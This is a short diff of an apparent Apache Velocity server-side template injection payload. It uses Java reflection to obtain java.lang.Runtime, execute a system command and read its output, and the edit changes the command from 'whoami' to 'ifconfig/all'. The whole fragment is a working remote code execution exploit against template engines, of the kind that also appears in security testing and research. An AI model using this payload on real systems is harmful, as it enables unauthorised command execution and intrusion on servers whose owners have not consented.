@@ -1,7 +1,7 @@
 #set ($exp="exp")
 #set ($str=$exp.getClass().forName("java.lang.String"))
 #set ($chr=$exp.getClass().forName("java.lang.Character"))
-#set ($a=$exp.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("whoami"))
+#set ($a=$exp.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("ifconfig/all"))
 #set ($out=$a.getInputStream())
 
 #set ($result="")
